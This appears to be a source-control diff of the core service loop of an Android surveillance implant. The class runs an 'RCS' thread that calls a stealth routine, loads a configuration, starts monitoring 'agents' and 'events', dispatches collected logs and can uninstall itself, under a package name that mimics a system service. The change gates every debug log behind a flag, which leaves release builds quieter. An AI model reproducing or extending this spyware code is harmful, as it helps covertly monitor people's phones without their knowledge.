@@ -16,7 +16,7 @@ import com.android.service.action.Action;
 import com.android.service.action.SubAction;
 import com.android.service.action.UninstallAction;
 import com.android.service.agent.AgentManager;
-import com.android.service.auto.AutoConfig;
+import com.android.service.auto.Cfg;
 import com.android.service.conf.Configuration;
 import com.android.service.event.EventManager;
 import com.android.service.file.AutoFile;
@@ -73,7 +73,7 @@ public class Core extends Activity implements Runnable {
 		try {
 			coreThread.start();
 		} catch (Exception e) {
-			if(AutoConfig.DEBUG) { e.printStackTrace(); }
+			if(Cfg.DEBUG) { e.printStackTrace(); }
 		}
 		
 		return true;
@@ -87,7 +87,7 @@ public class Core extends Activity implements Runnable {
 	public boolean Stop() {
 		bStopCore = true;
 		stopAll();
-		Log.d("QZ", TAG + " RCS Thread Stopped");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " RCS Thread Stopped");
 		return true;
 	}
 
@@ -98,39 +98,39 @@ public class Core extends Activity implements Runnable {
 	 * @see java.lang.Runnable#run()
 	 */
 	public void run() {
-		Log.d("QZ", TAG + " RCS Thread Started");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " RCS Thread Started");
 		
 		stealth();
 		
 		try {
 			while (!bStopCore) {
-				Log.d("QZ", TAG + " Info: init task");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: init task");
 
 				if (taskInit() == false) {
-					Log.d("QZ", TAG + " Error: TaskInit() FAILED");
+					if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: TaskInit() FAILED");
 					break;
 				} else {
-					Log.d("QZ", TAG + " TaskInit() OK");
+					if(Cfg.DEBUG) Log.d("QZ", TAG + " TaskInit() OK");
 					// CHECK: Status o init?
 				}
 
 				Status.self().setRestarting(false);
-				Log.d("QZ", TAG + " Info: starting checking actions");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: starting checking actions");
 
 				if (checkActions() == Exit.RELOAD) {
-					Log.d("QZ", TAG + " Info: Waiting a while before reloading");
+					if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: Waiting a while before reloading");
 					Utils.sleep(2000);
 				} else {
-					Log.d("QZ", TAG + " Error: CheckActions() wants to exit");
+					if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: CheckActions() wants to exit");
 					// chiudere tutti i thread
 					break;
 				}
 			}
 			stopAll();
 		} catch (final Exception ex) {
-			Log.d("QZ", TAG + " Error: run " + ex);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: run " + ex);
 		} finally {
-			Log.d("QZ", TAG + " AndroidService exit ");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " AndroidService exit ");
 			Utils.sleep(1000);
 			
 			System.runFinalizersOnExit(true);
@@ -142,14 +142,14 @@ public class Core extends Activity implements Runnable {
 	private void stopAll() {
 		Status status = Status.self();
 		status.setRestarting(true);
-		Log.d("QZ", TAG + " Warn: " + "checkActions: reloading");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " Warn: " + "checkActions: reloading");
 		status.unTriggerAll();
-		Log.d("QZ", TAG + " checkActions: stopping agents");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " checkActions: stopping agents");
 		agentManager.stopAll();
-		Log.d("QZ", TAG + " checkActions: stopping events");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " checkActions: stopping events");
 		eventManager.stopAll();
 		Utils.sleep(2000);
-		Log.d("QZ", TAG + " checkActions: untrigger all");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " checkActions: untrigger all");
 		status.unTriggerAll();
 
 		final LogDispatcher logDispatcher = LogDispatcher.self();
@@ -169,7 +169,7 @@ public class Core extends Activity implements Runnable {
 
 		try {
 			while (!bStopCore) {
-				Log.d("QZ", TAG + " checkActions");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " checkActions");
 				final int[] actionIds = status.getTriggeredActions();
 
 				for (int actionId : actionIds) {
@@ -177,12 +177,12 @@ public class Core extends Activity implements Runnable {
 					final Exit exitValue = executeAction(action);
 
 					if (exitValue == Exit.UNINSTALL) {
-						Log.d("QZ", TAG + " Info: checkActions: Uninstall");
+						if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: checkActions: Uninstall");
 						UninstallAction.actualExecute();
 
 						return exitValue;
 					} else if (exitValue == Exit.RELOAD) {
-						Log.d("QZ", TAG + " checkActions: want Reload");
+						if(Cfg.DEBUG) Log.d("QZ", TAG + " checkActions: want Reload");
 
 						return exitValue;
 					}
@@ -193,7 +193,7 @@ public class Core extends Activity implements Runnable {
 		} catch (final Throwable ex) {
 			// catching trowable should break the debugger ans log the full
 			// stack trace
-			Log.d("QZ", TAG + " FATAL: checkActions error, restart: " + ex);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " FATAL: checkActions error, restart: " + ex);
 
 			return Exit.ERROR;
 		}
@@ -212,7 +212,7 @@ public class Core extends Activity implements Runnable {
 			final Device device = Device.self();
 
 			if (!loadConf()) {
-				Log.d("QZ", TAG + " Error: Cannot load conf");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: Cannot load conf");
 				return false;
 			}
 
@@ -224,27 +224,27 @@ public class Core extends Activity implements Runnable {
 
 			// Da qui in poi inizia la concorrenza dei thread
 			if (eventManager.startAll() == false) {
-				Log.d("QZ", TAG + " eventManager FAILED");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " eventManager FAILED");
 				return false;
 			}
 
-			Log.d("QZ", TAG + " Info: Events started");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: Events started");
 
 			if (agentManager.startAll() == false) {
-				Log.d("QZ", TAG + " agentManager FAILED");
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " agentManager FAILED");
 				return false;
 			}
 		
-			Log.d("QZ", TAG + " Info: Agents started");
-			Log.d("QZ", TAG + " Core initialized");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: Agents started");
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Core initialized");
 			return true;
 
 		} catch (final GeneralException rcse) {
-			if(AutoConfig.DEBUG) { rcse.printStackTrace(); }
-			Log.d("QZ", TAG + " RCSException() detected");
+			if(Cfg.DEBUG) { rcse.printStackTrace(); }
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " RCSException() detected");
 		} catch (final Exception e) {
-			if(AutoConfig.DEBUG) { e.printStackTrace(); }
-			Log.d("QZ", TAG + " Exception() detected");
+			if(Cfg.DEBUG) { e.printStackTrace(); }
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Exception() detected");
 		}
 
 		return false;
@@ -274,7 +274,7 @@ public class Core extends Activity implements Runnable {
 			// Load the configuration
 			loaded = conf.LoadConfiguration();
 
-			Log.d("QZ", TAG + " Info: Conf file loaded: " + loaded);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: Conf file loaded: " + loaded);
 
 			if (!loaded) {
 				file.delete();
@@ -292,7 +292,7 @@ public class Core extends Activity implements Runnable {
 			// Load the configuration
 			loaded = conf.LoadConfiguration();
 
-			Log.d("QZ", TAG + " Info: Resource file loaded: " + loaded);
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: Resource file loaded: " + loaded);
 		}
 
 		return loaded;
@@ -315,14 +315,14 @@ public class Core extends Activity implements Runnable {
 	private Exit executeAction(final Action action) {
 		Exit exit = Exit.SUCCESS;
 
-		Log.d("QZ", TAG + " CheckActions() triggered: " + action);
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " CheckActions() triggered: " + action);
 		final Status status = Status.self();
 		status.unTriggerAction(action);
 
 		status.synced = false;
 
 		final int ssize = action.getSubActionsNum();
-		Log.d("QZ", TAG + " checkActions, " + ssize + " subactions");
+		if(Cfg.DEBUG) Log.d("QZ", TAG + " checkActions, " + ssize + " subactions");
 
 		int i = 1;
 		for( SubAction subAction : action.getSubActions()){
@@ -332,14 +332,14 @@ public class Core extends Activity implements Runnable {
 				 * final boolean ret = subAction.execute(action
 				 * .getTriggeringEvent());
 				 */
-				Log.d("QZ", TAG + " Info: (CheckActions) executing subaction (" + (i++) + "/" + ssize + ") : "
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: (CheckActions) executing subaction (" + (i++) + "/" + ssize + ") : "
 						+ action);
 
 				subAction.prepareExecute();
 				boolean ret = subAction.execute();
 
 				if (status.uninstall) {
-					Log.d("QZ", TAG + " Warn: (CheckActions): uninstalling");
+					if(Cfg.DEBUG) Log.d("QZ", TAG + " Warn: (CheckActions): uninstalling");
 					
 					UninstallAction.actualExecute();
 					
@@ -349,7 +349,7 @@ public class Core extends Activity implements Runnable {
 				}
 
 				if (status.reload) {
-					Log.d("QZ", TAG + " (CheckActions): reloading");
+					if(Cfg.DEBUG) Log.d("QZ", TAG + " (CheckActions): reloading");
 					stopAll();
 
 					exit = Exit.RELOAD;
@@ -358,11 +358,11 @@ public class Core extends Activity implements Runnable {
 				}
 
 				if (ret == false) {
-					Log.d("QZ", TAG + " Warn: " + "CheckActions() error executing: " + subAction);
+					if(Cfg.DEBUG) Log.d("QZ", TAG + " Warn: " + "CheckActions() error executing: " + subAction);
 					continue;
 				}
 			} catch (final Exception ex) {
-				Log.d("QZ", TAG + " Error: checkActions for: " + ex);
+				if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: checkActions for: " + ex);
 			}
 		}
 
